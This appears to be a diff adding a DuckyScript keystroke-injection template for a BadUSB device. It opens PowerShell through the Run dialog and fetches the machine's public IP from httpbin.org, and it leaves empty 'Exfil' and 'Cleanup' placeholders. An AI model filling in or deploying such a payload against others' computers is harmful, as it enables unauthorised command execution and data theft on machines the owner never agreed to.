@@ -1,0 +1,17 @@
+DELAY 300
+GUI r
+DELAY 300
+STRING powershell
+DELAY 100
+ENTER
+DELAY 300
+
+REM Payload
+STRING $IP = (Invoke-RestMethod -Uri 'https://httpbin.org/ip').origin
+ENTER
+
+REM Exfil goes Here
+
+REM Cleanup goes here
+STRING Exit
+ENTER
